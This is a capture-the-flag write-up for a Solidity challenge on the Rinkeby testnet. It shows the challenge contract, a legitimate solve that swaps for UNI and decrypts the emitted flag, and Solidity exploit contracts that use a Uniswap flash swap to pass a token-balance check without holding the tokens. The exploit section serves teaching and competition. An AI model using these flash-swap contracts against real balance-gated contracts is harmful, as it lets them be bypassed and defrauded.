# RICH CLUB

This final challenge was added as a tie-breaker. It was awful and as far as I am aware no one actually pulled off the correct way to solve the challenge.
I'll start by discussing the contract and then introduce the solution I used and the solution I should have used.

```solidity
pragma solidity ^0.6;
//SPDX-License-Identifier: MIT

interface ERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract RICH_CLUB {
    ERC20 UNI;
    event new_member(string pub_key);
    event send_flag(string pub_key, string flag);

    constructor() public{
        UNI = ERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    }

    function grant_membership(string memory _pub_key) public {
        require(bytes(_pub_key).length > 120, "invalid public key");
        require(UNI.balanceOf(msg.sender) >= 6e20, "you don't look rich to me");
        emit new_member(_pub_key);
    }

    function grant_flag(string memory _pub_key, string memory encoded_flag) public{
        require(msg.sender == address(0x30cE246A1282169895bf247abaE77BA69d5B2416), "you don't have access to this");
        emit send_flag(_pub_key, encoded_flag);
    }
}
```

The contract is simple, there are two functions `grant_membership` and `grant_flag`.
We are supposed to enter the club and a bot should grant us membership.
To enter the club, we send a public key and the function will check if we meet the requirements.

The public key had to be Ethereum compliant, which is `secp256k1`, you can generate a key-pair with `openssl`.
See here for more <http://www.herongyang.com/EC-Cryptography/EC-Key-secp256k1-with-OpenSSL.html>.

So, after generating a valid key we need to pass the second check, having `6e20` UNI coins in our account.
This is around 10 ETH, which we can easily get from a faucet.
To get the coin can go to <https://app.uniswap.org/#/swap> and swap them out.

This would yield the required coin, we would pass the check and an encrypted flag would be emitted.

> This is the only challenge that is not doable after the CTF since the flag emitter is a bot.
> I believe the bot is probably down.

The successful transaction looks like this: <https://rinkeby.etherscan.io/tx/0x0a60eb958bd34785c3e4cf06ad961ad66c1ac04401ad6ffb4cbb158e32eba46f#eventlog>.
The reply is in: <https://rinkeby.etherscan.io/tx/0xc5c7c98c7336422a3df076766444399ded7d68a907678f26950ec95264e1febc#eventlog>.

Converting the second part of the log to text would yield a Python byte string which we had to decrypt.
To do so, I used `ecies` (<https://github.com/ecies/py> their page is great to know more!).

You would write the following code (where `k` is your private key and `i` the received byte string).

```python
import ecies
ecies.decrypt(k, i)
> b'flag{l0@ns_ar3nt_7ha7_b@d_tbh8877}'
```

## The Correct Way To Do It

So, what makes this the right way to do it? Well, the admins said so.
I'll walk you through my process.

When the challenge came out, I had been snooping around the authors contracts.
While I didn't find anything interesting before, I did after.
I noticed the author of the challenge contract deployment had made some transactions to the contract, which failed.

This was one of them: <https://rinkeby.etherscan.io/tx/0xd69cc825db48b8d7083f76622002e3cbdba692444262a74c1b06bbead20c2576>.
Clicking in see more we can see:

```
Function: flashSwap(address _tokenBorrow, uint256 _amount, address _tokenPay, bytes _userData) ***

MethodID: 0x0322c064
[0]:  0000000000000000000000001f9840a85d5af5bf1d1762f925bdaddc4201f984
[1]:  00000000000000000000000000000000000000000000002086ac351052600000
[2]:  0000000000000000000000001f9840a85d5af5bf1d1762f925bdaddc4201f984
[3]:  0000000000000000000000000000000000000000000000000000000000000080
[4]:  0000000000000000000000000000000000000000000000000000000000000040
[5]:  f2d02606c02b1db40951e1dfc2432a851e41e652947d68ff009c0e09bb8990ea
[6]:  5417592a2785e4817d65a55c185d8f2be64643265a8b5464165f8e121cb75140
```

From here, I searched for `flashSwap` on Google and found Uniswap, which allows for such kind of transactions <https://uniswap.org/docs/v2/smart-contract-integration/using-flash-swaps/>.
So why is this relevant?

Flash swaps allow you to pretend to have the tokens, you ask for them to Uniswap,
they lend you the tokens and in the end of the transaction you return them.

This is all fine and dandy until you notice the API is a mess and imports in Remix don't really work that well.
During my search for a better method I found: <https://github.com/Austin-Williams/uniswap-flash-swapper>, which is the actual code used in the previous Etherscan link.

### The Exploit

Following the provided examples, getting the code to run is easy.

```solidity
contract ExampleContract is UniswapFlashSwapper {
    constructor(address _DAI, address _WETH) public UniswapFlashSwapper(_DAI, _WETH) {}

    function flashSwap(address _tokenBorrow, uint256 _amount, address _tokenPay, bytes calldata _userData) external {
        startSwap(_tokenBorrow, _amount, _tokenPay, _userData);
    }

    function execute(address _tokenBorrow, uint _amount, address _tokenPay, uint _amountToRepay, bytes memory _userData) internal override {
        RICH_CLUB club = RICH_CLUB(0xC7bEc01281648D3A7F9BB86B811A2de5B1E0cc61);
        string memory pub_key = "04df58e67b36a2de27b51e3673ed0040db93a44c71029071170dca30d98fb65b5b34b2c3009f3e031640f46924967db0651a750052a1cdafa577a50d0883ed1808";
        club.grant_membership(pub_key);
    }
}
```

Now you deploy with the ERC20 (`0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984`) and WETH (`0xc778417E063141139Fce010982780140Aa0cD5Ab`) addresses and call the `flashSwap` functions with the following parameters:
- `0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984`
- `600000000000000000000`
- `0xc778417E063141139Fce010982780140Aa0cD5Ab`
- `[0]`

This would execute the trade and call the function in `execute`.

You could also deploy a contract that did all this for you, in this case the contract would encode the function `f()` and pass it as bytecode:

```solidity
contract Exploit {
    function f() public {
        RICH_CLUB club = RICH_CLUB(0xC7bEc01281648D3A7F9BB86B811A2de5B1E0cc61);
        string memory pub_key = "04df58e67b36a2de27b51e3673ed0040db93a44c71029071170dca30d98fb65b5b34b2c3009f3e031640f46924967db0651a750052a1cdafa577a50d0883ed1808";
        club.grant_membership(pub_key);
    }

    function run() public {
        ExampleContract ec = ExampleContract(0xE1637EDDFaeabbfd9FE616E34581D62D0E839368);
        bytes memory payload = abi.encodeWithSignature("f()");
        ec.flashSwap(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984, 600000000000000000000, 0xc778417E063141139Fce010982780140Aa0cD5Ab, payload);
    }
}
```

This would grant you membership and allow you to access the club.
I was ready to first blood the challenge, so what went wrong?

### The Problem

The code wouldn't work, why? I still don't know, but I knew for sure it ran all the functions right.
From my experiments, it was not my problem, but rather the code I got from GitHub.
I believe it was not returning the tokens correctly.

I also did not find the error since the error was `[object Object]`.
*Remix being helpful*.

If you ever find the problem, tweet me [@duartejmg](https://twitter.com/duartejmg).